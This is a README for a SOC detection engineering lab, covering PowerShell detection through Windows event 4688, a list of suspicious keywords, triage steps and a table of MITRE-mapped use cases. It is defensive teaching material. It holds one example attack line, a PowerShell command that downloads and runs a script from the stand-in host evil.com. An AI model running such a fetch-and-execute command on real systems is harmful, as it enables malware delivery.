# Detection Engineering Lab

This repository contains hands-on SOC detection engineering labs focused on detecting attacker techniques using Windows logs and Sysmon.

The goal of this project is to simulate real-world attack techniques and build detection logic used by SOC analysts and Detection Engineers.

## Lab Environment

- Windows 11 Target Machine
- Kali Linux Attacker Machine
- Sysmon Logging
- Windows Event Logs
- Sigma Detection Rules

## Detection Use Cases

### Case 1 – Suspicious PowerShell Execution

This detection identifies suspicious PowerShell commands that may indicate malicious activity.

**Log Source**

Windows Security Log

**Event ID**

4688 – Process Creation

**Detection Logic**

Alert when PowerShell is executed with suspicious parameters such as:

- -nop
- -enc
- downloadstring
- IEX

Example attack:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"

**MITRE ATT&CK**

T1059.001 – PowerShell

## SOC Investigation Steps

- Investigate the process tree
- Identify the parent process
- Check network connections
- Determine if the activity is malicious
- Isolate the host if required

# Detection Engineering Lab

This repository contains practical detection engineering use cases based on Windows security logs and MITRE ATT&CK techniques.

## Detection Use Cases

| Use Case | Description | Technique |
|--------|-------------|-----------|
| Case1 – PowerShell Detection | Detect basic PowerShell execution | T1059.001 |
| Case2 – Encoded PowerShell | Detect PowerShell encoded commands | T1059.001 |
| Case3 – Suspicious Parent Process | Detect suspicious parent-child process relationships | T1059 |
| Case4 – PowerShell Spawning Rundll32 | Detect LOLBin abuse via rundll32 | T1218 |
| Case5 – Encoded Hidden PowerShell | Detect hidden encoded PowerShell execution | T1059.001 |

